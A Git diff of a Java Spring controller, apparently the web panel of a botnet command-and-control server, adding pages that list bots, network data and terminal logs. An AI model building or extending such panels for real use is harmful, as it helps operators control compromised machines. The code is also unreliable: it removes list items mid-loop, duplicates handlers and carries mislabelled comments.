@@ -9,6 +9,8 @@ import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.validation.Valid;
 
+import cs.sii.service.connection.NetworkService;
+import cs.sii.service.html.LogUtils;
 import org.apache.http.HttpStatus;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.authentication.AuthenticationTrustResolver;
@@ -43,22 +45,26 @@ public class SiteController {
 	private Config configEngine;
 
 	@Autowired
-	AuthenticationTrustResolver authenticationTrustResolver;
+	private AuthenticationTrustResolver authenticationTrustResolver;
 
 	@Autowired
-	PersistentTokenBasedRememberMeServices persistentTokenBasedRememberMeServices;
+	private PersistentTokenBasedRememberMeServices persistentTokenBasedRememberMeServices;
 
 	@Autowired
-	UserServiceImpl uServ;
+	private UserServiceImpl uServ;
 
 	@Autowired
-	RoleServiceImpl rServ;
+	private RoleServiceImpl rServ;
 
 	@Autowired
-	BotServiceImpl bServ;
+	private BotServiceImpl bServ;
 
 	@Autowired
 	private Commando cmm;
+
+	@Autowired
+	private LogUtils logHtml;
+
 
 	/**
 	 * @param error
@@ -108,15 +114,51 @@ public class SiteController {
 	}
 
 	@RequestMapping(value = "/admin/index", method = RequestMethod.GET)
-	public String indexAdmin(HttpServletResponse error) throws IOException {
+	public String indexAdmin(HttpServletResponse error,ModelMap model) throws IOException {
 		String result = "";
 		if (configEngine.isCommandandconquerStatus()) {
-			result = "indexadmin";
+			NetworkService c=cmm.getnServ();
+
+			model.addAttribute("data",c);
+			model.addAttribute("bots",bServ.findAll());
+			model.addAttribute("terminal",logHtml.getTerminalLine());
+			model.addAttribute("debug",logHtml.getDebugLine());
+
+			result="indexadmin";
 		} else {
 			error.sendError(HttpStatus.SC_NOT_FOUND);
 		}
 		return result;
 	}
+
+
+	/**
+	 * This method will provide the medium to add a new user.
+	 */
+	@RequestMapping(value = { "/user/rrr" }, method = RequestMethod.GET)
+	public ModelAndView test2() {
+		ModelAndView mav = new ModelAndView("userbotlist");
+		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
+		String idUser = auth.getName();
+		User usr = uServ.findBySsoId(idUser);
+		List<Bot> botList = bServ.findAll();
+		if (usr != null)
+			if (botList != null) {
+				for (Integer i = 0; i < botList.size(); i++) {
+					Bot bot = botList.get(i);
+					if (bot.getBotUser() != null) {
+						if (!usr.equals(bot.getBotUser())) {
+							botList.remove(bot);
+						}
+					} else
+						botList.remove(bot);
+				}
+				mav.addObject("bots", botList);
+			}
+		return mav;
+	}
+
+
 
 	/**
 	 * This method handles logout requests. Toggle the handlers if you are
@@ -316,5 +358,52 @@ public class SiteController {
 			return null;
 		}
 	}
+
+
+
+
+	////////////////////////////////SUPER NEW COSE////////////////////////////////////////////////////
+
+
+
+	/**
+	 * This method will provide the medium to add a new user.
+	 */
+	@RequestMapping(value = { "/user/showbotold" }, method = RequestMethod.GET)
+	public ModelAndView test() {
+		ModelAndView mav = new ModelAndView("userbotlist");
+		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
+		String idUser = auth.getName();
+		User usr = uServ.findBySsoId(idUser);
+		List<Bot> botList = bServ.findAll();
+		if (usr != null)
+			if (botList != null) {
+				for (Integer i = 0; i < botList.size(); i++) {
+					Bot bot = botList.get(i);
+					if (bot.getBotUser() != null) {
+						if (!usr.equals(bot.getBotUser())) {
+							botList.remove(bot);
+						}
+					} else
+						botList.remove(bot);
+				}
+				mav.addObject("bots", botList);
+			}
+		return mav;
+	}
+
+
+
+	/**
+	 * This method will provide the medium to add a new user.
+	 */
+	@RequestMapping(value = { "/admin/" }, method = RequestMethod.GET)
+	public String test(ModelMap model) {
+		model.addAttribute("usr", new User());
+		model.addAttribute("users", uServ.findAll());
+
+		return "deletebot";
+	}
+
 
 }
